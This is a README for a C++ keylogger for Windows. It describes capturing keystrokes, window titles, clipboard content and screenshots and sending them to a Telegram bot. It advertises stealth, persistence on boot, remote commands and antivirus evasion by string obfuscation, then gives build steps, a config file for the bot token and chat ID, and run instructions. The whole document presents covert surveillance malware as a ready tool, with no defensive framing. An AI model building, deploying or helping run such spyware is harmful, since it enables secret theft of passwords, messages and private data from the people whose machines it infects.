## Project Overview

This project is a keylogger written in C++ for the Windows operating system. It captures keystrokes, window titles, and clipboard content, and sends this information to a specified Telegram bot.

The keylogger has the following features:
*   **Stealth:** Runs as a windowless application.
*   **Persistence:** Can be configured to start automatically on system boot. This is controllable via Telegram commands.
*   **Remote Control:** Can be controlled via Telegram commands:
    *   `/start`: Starts the keylogger.
    *   `/persistence_enable`: Enables persistence.
    *   `/persistence_disable`: Disables persistence.
    *   `/screenshot`: Captures a screenshot and sends it to the Telegram bot.
*   **AV Evasion:** Uses string obfuscation to make it less detectable by antivirus software.

## Building the Project

To build this project, you will need:

*   A C++ compiler that supports C++17 (e.g., Visual Studio 2019 or later).
*   CMake (version 3.15 or later).
*   Ninja (optional, but recommended).

The project now uses a root `CMakeLists.txt` file that handles building the application and its dependencies.

1.  **Create a build directory:**
    ```bash
    mkdir build
    cd build
    ```

2.  **Configure CMake and build:**
    ```bash
    # This example is for Ninja.
    # Adjust the generator for your compiler if needed.
    cmake .. -G "Ninja"
    cmake --build . --config Release
    ```

This will create the `keylogger_telegram.exe` executable in the `build` directory. All necessary DLLs from the `cpr` library will be alongside it.

## Configuration

Before running the keylogger, you **MUST** create and configure a `config.ini` file in the same directory as the executable.

1.  Create a file named `config.ini`.
2.  Add the following content, replacing the placeholder values with your credentials:
    ```ini
    [Telegram]
    BotToken=YOUR_BOT_TOKEN_HERE
    ChatID=YOUR_CHAT_ID_HERE
    ```

## Running the Keylogger

To run the keylogger, simply execute the `keylogger_telegram.exe` file from the `build` directory.

```bash
./keylogger_telegram.exe
```

The program will run in the background. It logs keystrokes to `log.txt` and periodically sends them to the configured Telegram chat.